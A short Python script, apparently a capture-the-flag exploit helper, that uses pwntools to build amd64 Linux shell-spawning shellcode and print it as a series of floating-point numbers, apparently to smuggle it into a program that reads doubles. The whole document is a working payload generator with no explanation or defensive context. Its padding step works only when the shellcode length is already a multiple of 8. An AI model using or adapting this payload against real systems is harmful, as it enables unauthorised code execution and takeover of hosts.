import struct
from pwn import *
context.arch = 'amd64'
def u64todouble(bytes_data):
    return struct.unpack('<d', bytes_data)[0]

shellcode = asm(shellcraft.linux.sh())
shellcode += b'\x90' * (8 - len(shellcode))
for i in range(0, len(shellcode), 8):
    print(u64todouble(shellcode[i:i+8]))
print("EOF")